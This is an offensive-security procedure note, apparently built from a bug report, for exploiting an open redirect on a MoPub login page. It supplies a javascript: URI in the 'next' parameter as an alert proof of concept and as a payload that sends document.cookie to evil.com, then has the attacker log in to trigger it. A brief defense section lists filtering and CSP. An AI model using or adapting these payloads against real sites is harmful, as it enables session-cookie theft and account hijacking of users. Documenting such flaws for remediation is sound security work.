---
id: uuid-proc-4-683298
tags:
  - xss
  - javascript-uri
  - cookie-jacking
type: procedure
tools: []
tactics:
  - '[[Execution]]'
  - '[[Collection]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
  - '[[Steal Web Session Cookie]]'
updated_at: '2025-12-14T17:24:35.070Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[JavaScript]]'
  - '[[Steal Web Session Cookie]]'
---
# Observe-and-Execute-JavaScript-Redirect

## Summary

This procedure exploits the open redirect by using a javascript: URI in the 'next' parameter to execute arbitrary JavaScript post-login, achieving XSS for cookie theft or other client-side attacks.

## Description

The vulnerability's failure to filter javascript schemes allows the 'next' parameter to execute code after authentication, such as alerting for proof-of-concept or exfiltrating cookies to an attacker server. This leads to session hijacking, phishing escalation, and data theft in a web environment.

## Requirements

1. Modified URL with javascript: payload.
2. Valid MoPub credentials.
3. Attacker server for data exfil (optional for advanced payloads).

## Defense

Defensive measures and detection strategies:

- Filter out javascript: and other dangerous schemes in redirect parameters.
- Implement strict CSP to block inline JavaScript execution.
- Monitor for anomalous JavaScript network requests post-login.

## Objectives

1. Execute JavaScript via redirect for XSS confirmation.
2. Steal session cookies or perform actions.
3. Demonstrate full impact including jacking and hijacking.

## Instructions

### Step 1: Set JavaScript Payload

**Context**: Update 'next' to a javascript URI.

Use:

```url
https://app.mopub.com/login?next=javascript:alert('XSS PoC')
```

For exfil:

```url
https://app.mopub.com/login?next=javascript:fetch('https://evil.com?cookie='+document.cookie)
```

> Load and login.

### Step 2: Trigger and Observe Execution

**Context**: Authenticate to run the script.

Submit credentials.

> Expected: Alert pops or request sent to evil.com with cookie data.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution
- [[Collection]] Collection

### Techniques

- [[JavaScript]] JavaScript
- [[Steal Web Session Cookie]] Steal Web Session Cookie

### Sub-Techniques

- None

## Commands Used

- None

## Tools Used

- None

## Tags

- [[xss]]
- [[Execution]]
